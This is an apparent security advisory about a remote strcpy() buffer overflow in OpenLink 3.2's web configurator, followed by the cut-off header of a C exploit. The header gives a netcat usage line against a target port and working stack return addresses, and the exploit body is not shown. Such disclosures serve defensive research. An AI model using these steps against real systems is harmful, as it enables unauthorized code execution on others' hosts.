Both the Unix and WindowsNT versions of OpenLink 3.2 are vulnerable to a remotely exploitable buffer overflow attack. The problem is in their web configuration utility, and is the result of an unchecked strcpy() call. The consequence is the execution of arbitrary code on the target host (running the configuration utility) with the priviliges of the web software.

#include <stdio.h>
#include <unistd.h>

/*
 * Exploit for Openlink's web configurator for Linux/glibc2
 *  use: pipe through netcat to openlink web port (8000 default)
 *  ex: ./oplwall 0xbffffb85 | nc machine.to.hit 8000
 *  makes www_sv execute /usr/bin/wall if you hit the address right
 *
 * For informational purposes only.  This was written to show that
 *  there's a problem, not for skr1pt k1dd33z --.
 *  don't ask me for help on how to use this to crack systems,
 *  help compiling or anything else.  It will only compile on
 *  an x86 compiler however.
 *
 * Addresses that work for me: 0xbffffb65 (initial run of the broker)
 *                             0xbffffb85 (all consecutive attempts)
 *                             probably tied to process ID www_sv runs as;
 *                             first try PIDs were in triple digits, others
 *                             4 digit PIDs.
 *
 * If this works, generally no more www_sv processes will be run as a side effect.
